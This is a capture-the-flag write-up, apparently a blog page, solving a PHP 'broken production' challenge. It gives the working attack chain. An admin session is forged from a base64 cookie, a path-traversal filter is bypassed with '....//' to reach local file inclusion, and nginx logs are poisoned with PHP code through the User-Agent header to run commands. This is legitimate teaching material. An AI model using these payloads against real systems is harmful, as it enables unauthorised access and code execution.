1:"$Sreact.fragment"
2:I[10453,["/_next/static/chunks/b9afcb09c56609a6.js","/_next/static/chunks/59d5dd52dd9fcb16.js","/_next/static/chunks/0eb309e820c00a6d.js","/_next/static/chunks/239c8c4944a9f036.js","/_next/static/chunks/39b99946d2be6a43.js"],"default"]
20:I[97367,["/_next/static/chunks/ff1a16fafef87110.js","/_next/static/chunks/b71c1cfea9076b4b.js"],"OutletBoundary"]
21:"$Sreact.suspense"
:HL["https://gist.github.com/user-attachments/assets/41a17715-eea8-447d-9909-ff31140957f5","image"]
:HL["https://gist.github.com/user-attachments/assets/8b97dde8-7959-4917-94b3-11134e06b4e0","image"]
:HL["https://gist.github.com/user-attachments/assets/06c166c3-9cb5-4b40-bc71-7f61370715d7","image"]
:HL["https://gist.github.com/user-attachments/assets/31b2d71e-38b9-4918-88ca-ce230ee4d59b","image"]
3:T73d,<?php
spl_autoload_register(function ($name){
    if (preg_match('/Controller$/', $name))
    {
        $name = "controllers/${name}";
    }
    else if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});

$session  = new SessionHandler();
$database = new Database('/tmp/challenge.db');

$router = new Router();
$router->new('GET', '/', function($router) use ($session){
    if (!$session->isLoggedIn()) 
    {
        return header('location: /login');
    }

    return $router->view('index', ['admin' => $session->isAdmin(), 'username' => $session->getUsername()]);
});

$router->new('GET', '/login', function($router)  use ($session){
    if ($session->isLoggedIn()) 
    {
        return header('location: /');
    }

    return $router->view('login');
});

$router->new('GET', '/register', function($router)  use ($session){
    if ($session->isLoggedIn()) 
    {
        return header('location: /');
    }

    return $router->view('register');
});

$router->new('POST', '/auth/login', function($router) use ($database, $session){
    $user = $database->login($_POST['username'], $_POST['password']);
    if (!$user) return header('location: /login?msg=Invalid username or password!');
    $session->login($_POST['username']);
    header('location: /');
    exit;
});

$router->new('POST', '/auth/register', function($router)  use ($database){
    if ($_POST['username'] === 'admin') return header('location: /register?msg=This user already exists!');
    $database->register($_POST['username'], $_POST['password']);
    header('location: /login?msg=The account registered successfully!&reg=true');
    exit;
});


$router->new('GET', '/logout', function($router)  use ($session){
    
    $session->distroy();
    return header('location: /login');
    
});


die($router->match());0:{"buildId":"QiRS6Sx9Ttvp1BSl4xu2I","rsc":["$","$1","c",{"children":[["$","div",null,{"children":["$","main",null,{"className":"text-pretty max-w-5xl mx-auto text-sm [&_h1]:text-5xl [&_h1]:font-semibold [&_h1]:mb-8 [&_blockquote]:text-secondary [&_blockquote]:space-y-3 [&_blockquote]:border-l-4 [&_blockquote]:border-secondary [&_blockquote]:pl-5 [&_blockquote]:mb-5 [&>_p]:my-4 [&_img]:my-5 [&_ul]:list-disc [&_ul]:pl-6 [&_ol]:list-decimal [&_ol]:pl-6 [&_img]:rounded [&_li]:my-2","children":[["$","h1","h1-0",{"children":"Hack the Madness CTF Round 2 â€” broken production"}],"\n",["$","blockquote","blockquote-0",{"children":["\n",["$","p","p-0",{"children":"Our PHP devs are working on this employee management portal. We have a mock build of the website and you are to pentest the platform for weaknesses. Your goal is to get more privileges and command execution on the server."}],"\n"]}],"\n",["$","p","p-0",{"children":"We're given a PHP server that looks like this:"}],"\n",["$","$L2","pre-0",{"className":"my-2","children":"$3","language":"php"}],"\n",["$","p","p-1",{"children":["Looking in ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"views/index.php"}]," and ",["$","code","code-1",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"SessionHandler.php"}],","]}],"\n",["$","$L2","pre-1",{"className":"my-2","children":"<?php if ($admin){\n\t\tinclude_once \"admin.php\";\n\t} else{\n\t\tinclude_once \"user.php\";\n\t}\n?>","language":"php"}],"\n",["$","$L2","pre-2",{"className":"my-2","children":"<?php\nclass SessionHandler\n{\n    public function __construct()\n    {\n        if (!empty($_COOKIE['PHPSESSID'])){\n            $this->cookie = $_COOKIE['PHPSESSID'];\n            $this->load();\n        }\n    }\n\n    public function login($username)\n    {\n        setcookie('PHPSESSID', base64_encode(json_encode([\n            'username' => $username\n        ])), time()+1333337, '/');\n    }\n\n    public function load()\n    {\n        $this->data = json_decode(base64_decode($this->cookie));\n    }\n\n    public function isLoggedIn()\n    {\n        return !is_null($this->data->username);\n    }\n\n    public function isAdmin()\n    {\n        return $this->data->username === 'admin';\n    }\n\n    public function getUsername()\n    {\n        return $this->data->username;\n    }\n\n    public function distroy()\n    {\n        unset($_COOKIE['PHPSESSID']);\n        setcookie('PHPSESSID', '', time() - 3600, '/');\n    }\n}","language":"php"}],"\n","$L4","\n","$L5","\n","$L6","\n","$L7","\n","$L8","\n","$L9","\n","$La","\n","$Lb","\n","$Lc","\n","$Ld","\n","$Le","\n","$Lf","\n","$L10","\n","$L11","\n","$L12","\n","$L13","\n","$L14","\n","$L15","\n","$L16","\n","$L17","\n","$L18","\n","$L19"]}]}],["$L1a","$L1b","$L1c","$L1d"],"$L1e"]}],"loading":null,"isPartial":false}
4:["$","p","p-2",{"children":["it seems we can pretty easily log in as admin by base64 encoding the string ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"{\"username\":\"admin\"}"}],", e.g. something like"]}]
5:["$","$L2","pre-3",{"className":"my-2","children":"ewogICJ1c2VybmFtZSI6ICJhZG1pbiIKfQ"}]
6:["$","p","p-3",{"children":["Replacing our ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"PHPSESSID"}]," cookie with that, we get to the admin dashboard:"]}]
7:["$","p","p-4",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/41a17715-eea8-447d-9909-ff31140957f5","alt":"image"}]}]
8:["$","p","p-5",{"children":"Looking at the admin view,"}]
1f:Tacb,<?php

$utilFile = "tickets.php";

if (isset($_GET['util']))
	$utilFile = $_GET['util'];
	$utilFile = str_replace("../","", $utilFile);

$fullPath = '/www/utils/'.$utilFile;

?>
<!DOCTYPE html>
<html lang="en">
<head>
	<title>Broken Production</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!-- ... -->
</head>
<body>
	
	<body>
    <div id="wrapper">
        <!-- Sidebar -->
        <div id="sidebar-wrapper">
            <ul class="sidebar-nav">
                <li class="sidebar-brand">
                    <a href="#">
                        Admin Dashboard (Under Construction)
                    </a>
                </li>
                <div class="profile-sidebar">
                    <!-- SIDEBAR USERPIC -->
                    <div class="profile-userpic">
                        <img src="/static/images/makelaris.png" class="img-responsive" alt="">
                    </div>
                    <!-- END SIDEBAR USERPIC -->
                    <!-- SIDEBAR USER TITLE -->
                    <div class="profile-usertitle">
                        <div class="profile-usertitle-name">
                            <?php echo $username ?>
                        </div>
                        <div class="profile-usertitle-job">
                            Administrator
                        </div>
                    </div>
                    <!-- END SIDEBAR USER TITLE -->
                    <!-- SIDEBAR BUTTONS -->
                    <div class="profile-userbuttons">
                        <a href="/logout" class="btn btn-danger btn-xs">Log Out</a>
                    </div>
                </div>
            </ul>
        </div>
        <!-- /#sidebar-wrapper -->

        <!-- Page Content -->
        <div id="page-content-wrapper">

            <div class="container-fluid">
                <div class="row text-right mb-4">
	                <div class="col">
	                    <select class="custom-select" id="gotoPage">
	                    	<?php 
	                    		echo "<option value='$utilFile' selected='true'>$utilFile</option>";

	                    		$pages = array("logs.php", "tickets.php", "todo.php");
	                    		foreach ($pages as $page){
	                    			if($page != $utilFile){
	                    				echo "<option value='$page'>$page</option>";
	                    			}
	                    		}
	                    	?>
						</select>  
	                </div>    
	            </div>

                <div class="manage-box">
                	<?php include_once($fullPath); ?>
                </div>
            </div>
        </div>
        <!-- /#page-content-wrapper -->

    </div>
</body>
<!-- ... -->

</html>9:["$","$L2","pre-4",{"className":"my-2","children":"$1f","language":"php"}]
a:["$","p","p-6",{"children":["it looks like we get local file inclusion, but with path traversal blocked by a ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"str_replace"}],"."]}]
b:["$","p","p-7",{"children":["However, we can very easily get around this filter by passing a query param such as ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"....//....//etc/passwd"}],": the script will delete every instance of ",["$","code","code-1",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"../"}],", leaving us with a file inclusion of ",["$","code","code-2",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"/var/www/../../etc/passwd"}],"."]}]
c:["$","p","p-8",{"children":"We still can't directly include the flag, though; looking at the dockerfile, the flag file's name is randomly generated at build time."}]
d:["$","$L2","pre-5",{"className":"my-2","children":"FROM alpine:edge\n\n# Setup usr\nRUN adduser -D -u 1000 -g 1000 -s /bin/sh www\n\n# Install system packages\nRUN apk add --no-cache --update supervisor nginx php7-fpm php7-sqlite3 php7-json\n\n# Configure php-fpm and nginx\nCOPY config/fpm.conf /etc/php7/php-fpm.d/www.conf\nCOPY config/supervisord.conf /etc/supervisord.conf\nCOPY config/nginx.conf /etc/nginx/nginx.conf\n\n# Copy challenge files\nCOPY challenge /www\n\n# Copy flag\nRUN RND=$(echo $RANDOM | md5sum | head -c 15) && \\\n\techo \"HTB{f4k3_fl4g_f0r_t3st1ng}\" > /flag_${RND}.txt\n\n# Setup permissions\nRUN chown -R www:www /var/lib/nginx\n\n# Expose the port nginx is listening on\nEXPOSE 80\n\nCMD /usr/bin/supervisord -c /etc/supervisord.conf","language":"Dockerfile"}]
e:["$","p","p-9",{"children":["Then, we can try to get RCE instead. Looking at the nginx config, we can see\nthat the server logs requests to ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"/var/log/nginx/access.log"}],":"]}]
f:["$","$L2","pre-6",{"className":"my-2","children":"user www;\npid /run/nginx.pid;\nerror_log /dev/stderr info;\n\nevents {\n    worker_connections 1024;\n}\n\nhttp {\n    server_tokens off;\n    log_format docker '$remote_addr $remote_user $status \"$request\" \"$http_referer\" \"$http_user_agent\" ';\n    access_log /var/log/nginx/access.log docker;\n\n    charset utf-8;\n    keepalive_timeout 20s;\n    sendfile on;\n    tcp_nopush on;\n    client_max_body_size 1M;\n\n    include /etc/nginx/mime.types;\n\n    server {\n        listen 80;\n        server_name _;\n\n        index index.php;\n        root /www;\n\n        location / {\n            try_files $uri $uri/ /index.php?$query_string;\n            location ~ \\.php$ {\n                try_files $uri =404;\n                fastcgi_pass unix:/run/php-fpm.sock;\n                fastcgi_index index.php;\n                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\n                include fastcgi_params;\n            }\n        }\n    }\n}","language":"conf"}]
10:["$","p","p-10",{"children":"(indeed, one of the tabs in the admin dashboard lets you view this file directly:)"}]
11:["$","p","p-11",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/8b97dde8-7959-4917-94b3-11134e06b4e0","alt":"image"}]}]
12:["$","p","p-12",{"children":"Thus, we can write arbitrary PHP code to the log file by manipulating the HTTP user agent, and then include this file via LFI for RCE:"}]
13:["$","$L2","pre-7",{"className":"my-2","children":"await (await fetch('http://94.237.53.57:54572/', {\n    headers: { 'User-Agent': '<?php phpinfo(); ?>' }\n})).text()","language":"js"}]
14:["$","p","p-13",{"children":["(which requires Firefox, since Chromium ",["$","a","a-0",{"href":"https://stackoverflow.com/questions/42815087/sending-a-custom-user-agent-string-along-with-my-headers-fetch","children":["disallows setting a custom user agent in ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"fetch"}]]}],")."]}]
15:["$","p","p-14",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/06c166c3-9cb5-4b40-bc71-7f61370715d7","alt":"image"}]}]
16:["$","p","p-15",{"children":"We can use the RCE to give us the flag file name with e.g."}]
17:["$","$L2","pre-8",{"className":"my-2","children":"await (await fetch(window.location, {\n    headers: { 'User-Agent': '<?php echo `ls /`; ?>' }\n})).text() ","language":"js"}]
18:["$","p","p-16",{"children":"and include it with LFI to get the flag:"}]
19:["$","p","p-17",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/31b2d71e-38b9-4918-88ca-ce230ee4d59b","alt":"image"}]}]
1a:["$","script","script-0",{"src":"/_next/static/chunks/59d5dd52dd9fcb16.js","async":true}]
1b:["$","script","script-1",{"src":"/_next/static/chunks/0eb309e820c00a6d.js","async":true}]
1c:["$","script","script-2",{"src":"/_next/static/chunks/239c8c4944a9f036.js","async":true}]
1d:["$","script","script-3",{"src":"/_next/static/chunks/39b99946d2be6a43.js","async":true}]
1e:["$","$L20",null,{"children":["$","$21",null,{"name":"Next.MetadataOutlet","children":"$@22"}]}]
22:null
